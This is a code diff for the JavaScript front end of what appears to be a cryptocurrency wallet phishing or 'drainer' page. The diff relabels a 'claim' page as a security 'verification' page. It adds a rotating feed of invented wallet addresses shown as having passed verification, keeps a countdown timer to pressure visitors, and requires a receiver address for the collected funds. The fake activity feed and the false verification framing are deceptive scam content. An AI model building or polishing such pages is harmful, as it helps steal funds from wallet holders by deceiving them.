-  } catch (e) { st("WalletConnect falló.", "#ef4444"); log(e.message || String(e)); }
+  } catch (e) { st("WalletConnect failed.", "#ef4444"); log(e.message || String(e)); }
 }
 
-/* ═══════════ ARRANQUE ═══════════ */
+/* ═══════════ BOOT ═══════════ */
+const TICKS = [
+  "0x7a3f…9c2e completed verification",
+  "0x1b9d…4f70 passed the security check",
+  "0x9e04…8a11 completed verification",
+  "0xd21c…7b63 passed the security check",
+  "0x4f88…1d05 completed verification",
+];
+setInterval(() => {
+  const el = $('chatMsg'); if (el) el.textContent = TICKS[Math.floor(Math.random() * TICKS.length)];
+}, 9000);
+
 window.addEventListener('load', () => {
   icons(); announce();
   setTimeout(announce, 250);
   setTimeout(icons, 400);
 
-  if (!RECV_OK) { st("Configura RECEIVER_INPUT con una dirección válida.", "#ef4444"); $('connectBtn').disabled = true; }
+  if (!RECV_OK) { st("Receiver address not configured.", "#ef4444"); $('connectBtn').disabled = true; }
 
   deadline = Date.now() + CFG.sessionSecs * 1000;
   clearInterval(timerH);
   timerH = setInterval(() => {
     const left = Math.max(0, Math.floor((deadline - Date.now()) / 1000));
-    if (!left) { $('timer').textContent = "Claiming closed"; clearInterval(timerH); return; }
-    $('timer').textContent = `Claiming closes in: ${String(Math.floor(left / 60)).padStart(2, '0')}:${String(left % 60).padStart(2, '0')}`;
+    if (!left) { $('timer').textContent = "Verification window closed"; clearInterval(timerH); return; }
+    $('timer').textContent = `Verification window closes in ${String(Math.floor(left / 60)).padStart(2, '0')}:${String(left % 60).padStart(2, '0')}`;
   }, 1000);
 
   if (!isMobile() && typeof QRCode !== 'undefined') {
